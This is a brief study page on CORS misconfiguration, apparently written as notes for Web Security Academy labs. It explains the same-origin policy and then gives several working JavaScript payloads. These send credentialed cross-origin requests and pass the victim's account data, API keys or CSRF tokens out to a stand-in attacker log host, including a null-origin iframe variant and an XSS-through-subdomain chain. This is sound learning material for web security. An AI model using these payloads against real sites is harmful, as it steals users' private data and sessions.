---
icon: share-nodes
---

# CORS

**Same-origin policy**

The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.

{% code overflow="wrap" %}
```javascript
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; 
	req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	req.withCredentials = true; 
	req.send(); 

	function reqListener() { 
		location='/log?key='+this.responseText; 
	}; 
</script>
```
{% endcode %}

`req.withCredentials = true;`: This ensures that any credentials (cookies or authentication tokens) tied to the current domain are sent with the request. This is crucial for CSRF attacks, where the attacker wants to trigger actions using the victim’s session cookies.



If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

{% code overflow="wrap" %}
```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; 
req.send(); 

function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
```
{% endcode %}



{% code overflow="wrap" %}
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>
```
{% endcode %}

Exploit cors through vulnerable subdomain with xss:

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`&#x20;

{% code overflow="wrap" %}
```javascript
<script>
	document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
{% endcode %}
